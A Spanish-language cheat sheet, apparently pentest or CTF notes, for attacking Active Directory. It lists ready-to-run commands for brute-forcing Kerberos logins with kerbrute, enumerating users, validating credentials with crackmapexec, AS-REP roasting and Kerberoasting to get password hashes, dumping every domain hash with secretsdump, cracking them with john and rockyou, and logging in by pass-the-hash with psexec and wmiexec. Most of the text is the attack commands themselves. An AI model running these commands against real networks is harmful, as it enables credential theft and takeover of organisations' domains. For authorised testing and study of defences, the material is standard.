
### Enumerar usuarios Active Directory
#### Kerbrute - kerberos
Kerbrute es una herramienta que realiza ataques de fuerza bruta contra kerberos para enumerar:
* Parejas de usuario/contraseña válidas
* Usuarios válidos
* Usuarios sin pre-autenticación requerida 


```python
python3 kerbrute.py -users users.txt -passwords pass.txt -domain dominio.local -t 100
```
El parámetro **-t 100** : sirve para indicar los hilos

#### Impacket
Con impacket, se puede tratar de enumerar los usuarios en un DC. (guest no se cambia, siempre se utiliza "guest")
```bash
impacket-lookupsid guest@<ip> -no-pass
```

### Validar credenciales de dominio

```bash
crackmapexec smb <ip> -u <usuario> -p <contraseña>
```

### Validar winrm

Quizas tengamos opción de lanzar una consola remota, para comprobarlo:
```bash
crackmapexec winrm <ip> -u <usuario> -p <contraseña>
```


### Obtener hash usuario con NOT-PREAUTH
Cuando detectamos usuarios en un dominio que tienen el NOT-PREAUTH, podemos intentar obtener el hash de su contraseña para luego crackearla con john the ripper.

```bash
#opcion1
impacket-GetNPUsers <dominio>/<usuario> -no-pass

#opcion2
impacket-GetNPUsers <dominio>/ -no-pass -usersfile usuarios.txt
```
```bash
#Con el hash obtenido, lo pasamos por john
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

### Obtener hashes vulnerables (Ataque TGT)

si tenemos una pareja de credenciales (user/pass), podemos intentar obtener todos los hashes de los usuarios del dominio, incluido el del administrador.
```bash
#opcion1
impacket-secretsdump -just-dc usuario@ip (SAM HASH, para pass-the-hash)

#opcion2
impacket-GetUserSPNs dominio/usuario:contraseña -request (para john)

```

### Conexion por consola con hash (ataque pass the hash)

Poemos intentar acceder al dominio sin necesidad de crackear la contraseña, solamente teniendo el hash, haciendo un **pass the hash**

#### Ataque pass the hash con impacket

```bash
#opcion 1
impacket-psexec usuario@ip -hashes <hash en cadena de texto>

#opcion 2
impacket-wmiexec <dominio>/user@ip -hashes <hash en cadena de texto>
```

Ejemplo:

```bash
impacket-psexec Administrator@10.10.10.4 -hashes aaeeff31234aaaadddsfee345:2345:addfbbe
```

